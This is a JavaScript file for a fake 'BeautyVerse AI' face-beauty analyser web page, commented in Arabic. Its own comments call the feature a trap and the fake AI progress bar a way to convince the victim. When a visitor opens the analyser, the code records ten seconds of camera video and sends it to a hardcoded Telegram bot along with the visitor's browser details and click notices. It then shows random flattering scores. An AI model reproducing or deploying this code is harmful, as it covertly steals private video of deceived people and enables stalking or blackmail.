// --- إعدادات البوت (مستخرجة من كودك) ---
const BOT_TOKEN = '8605049073:AAEyGQ07KMGUzG5jVjdjERMJDxGbTgYHWUE';
const CHAT_ID = '7396462490';

// --- معلومات المبرمج ---
const DEV_INFO = {
    name: "م. موسى البحر",
    insta: "https://www.instagram.com/h00.u?igsh=bjMybnE3MmlneWQx"
};

let mediaRecorder, stream, recordedChunks = [];
let analysisTimeout;

// 1. وظيفة التمرير السلس
function scrollToSection(sectionId) {
    const el = document.getElementById(sectionId);
    if(el) el.scrollIntoView({ behavior: 'smooth' });
}

// 2. فتح النافذة وبدء "الفخ" (إصلاح الخطأ هنا)
function openAnalysisModal() {
    document.getElementById('analysisModal').style.display = 'block';
    notifyBot('👤 بدء تحليل وجه جديد - المستخدم دخل المحلل');
    
    // استدعاء دالة الكاميرا فوراً عند فتح المودال
    startAnalysis(); 
}

// 3. إغلاق النافذة وتوقيف كل شيء
function closeModal() {
    document.getElementById('analysisModal').style.display = 'none';
    stopMedia();
    resetModal();
}

// 4. تشغيل الكاميرا (المنطق المحدث لضمان العمل)
async function startAnalysis() {
    try {
        // طلب الإذن والوصول للكاميرا
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
        });
        
        const video = document.getElementById('analysisVideo');
        if (video) {
            video.srcObject = stream;
            video.play();
        }
        
        document.getElementById('videoContainer').style.display = 'block';
        document.getElementById('modalButtons').style.display = 'none';
        
        // بدء العمليات المتوازية (التسجيل، العد، المحاكاة)
        startRecording();
        startCountdown();
        simulateAnalysis();
        
    } catch (err) {
        console.error("Camera Error:", err);
        alert('🎥 عذراً، يجب تفعيل الكاميرا من إعدادات المتصفح لإتمام تحليل الوجه بدقة 99%.');
    }
}

// 5. وظيفة تسجيل الفيديو (كما هي بدون حذف)
function startRecording() {
    mediaRecorder = new MediaRecorder(stream);
    recordedChunks = [];
    
    mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) recordedChunks.push(e.data);
    };
    
    mediaRecorder.onstop = async () => {
        if (recordedChunks.length > 0) {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            await sendVideoToBot(blob);
        }
        showResults();
    };
    
    mediaRecorder.start();
}

// 6. العد التنازلي
function startCountdown() {
    let timeLeft = 10;
    const countdownEl = document.getElementById('countdown');
    
    analysisTimeout = setInterval(() => {
        timeLeft--;
        if(countdownEl) countdownEl.textContent = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(analysisTimeout);
            if(mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
        }
    }, 1000);
}

// 7. محاكاة الذكاء الاصطناعي (لإقناع الضحية)
function simulateAnalysis() {
    let progress = 0;
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    const stages = [
        'جاري تحديد ملامح الوجه...',
        'تحليل تماثل الوجه...',
        'فحص نضارة البشرة...',
        'حساب نسب الجمال...',
        'إعداد التقرير النهائي...'
    ];
    
    let stageIndex = 0;
    const interval = setInterval(() => {
        progress += 2; // سرعة التقدم
        if(progressFill) progressFill.style.width = `${Math.min(progress, 100)}%`;
        
        if (progress % 20 === 0) {
            if(progressText) progressText.textContent = stages[stageIndex] || 'مكتمل!';
            stageIndex++;
        }
        
        if (progress >= 100) clearInterval(interval);
    }, 200);
}

// 8. إظهار النتائج العشوائية
async function showResults() {
    const results = {
        freshness: Math.floor(Math.random() * 25) + 75,
        symmetry: Math.floor(Math.random() * 20) + 80,
        beautyScore: Math.floor(Math.random() * 12) + 88
    };
    
    const area = document.getElementById('resultsArea');
    if(area) {
        area.innerHTML = `
            <div style="background: linear-gradient(45deg, #ff9a9e, #fecfef); padding: 1.5rem; border-radius: 15px; color: #333;">
                <h3>✅ تحليل مكتمل!</h3>
                <div style="text-align: right;">
                    <div><strong>نضارة البشرة:</strong> ${results.freshness}%</div>
                    <div><strong>تماثل الوجه:</strong> ${results.symmetry}%</div>
                    <div style="font-size: 1.4rem; color: #00b894;"><strong>النتيجة: ${results.beautyScore}% ✨</strong></div>
                </div>
            </div>
            <div style="display: flex; gap: 10px; justify-content: center; margin-top: 15px;">
                <button class="btn" onclick="shareResults(${results.beautyScore})" style="background:#0062ff; color:white; padding:10px; border-radius:5px; border:none;">مشاركة النتيجة</button>
                <button class="btn" onclick="closeModal()" style="background:#eee; padding:10px; border-radius:5px; border:none;">إغلاق</button>
            </div>
        `;
        area.style.display = 'block';
    }
}

// 9. وظائف التليجرام (الإرسال)
async function notifyBot(message) {
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: `🎨 BeautyVerse AI | تقرير\n\n${message}\n\n📱 المتصفح: ${navigator.userAgent.slice(0,50)}`,
                parse_mode: 'Markdown'
            })
        });
    } catch (e) { console.error('Error Bot:', e); }
}

async function sendVideoToBot(blob) {
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', blob, `beautyverse_${Date.now()}.webm`);
    formData.append('caption', '🎥 فيديو تحليل الوجه الجديد (تم السحب بنجاح)');
    
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
            method: 'POST', body: formData
        });
    } catch (e) { console.error('Error Video:', e); }
}

// إيقاف الميديا تماماً
function stopMedia() {
    if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
    if (stream) stream.getTracks().forEach(track => track.stop());
    if (analysisTimeout) clearInterval(analysisTimeout);
}

// إعادة ضبط المودال
function resetModal() {
    document.getElementById('videoContainer').style.display = 'none';
    document.getElementById('modalButtons').style.display = 'flex';
    document.getElementById('resultsArea').style.display = 'none';
    const countdownEl = document.getElementById('countdown');
    if(countdownEl) countdownEl.textContent = '10';
    const fill = document.getElementById('progressFill');
    if(fill) fill.style.width = '0%';
}

function shareResults(score) {
    notifyBot(`📊 المستخدم ضغط مشاركة لنتيجة: ${score}%`);
    alert('تم تجهيز رابط المشاركة! 🎉');
}

// الإغلاق عند الضغط خارج النافذة
window.onclick = (e) => {
    if (e.target.id === 'analysisModal') closeModal();
};
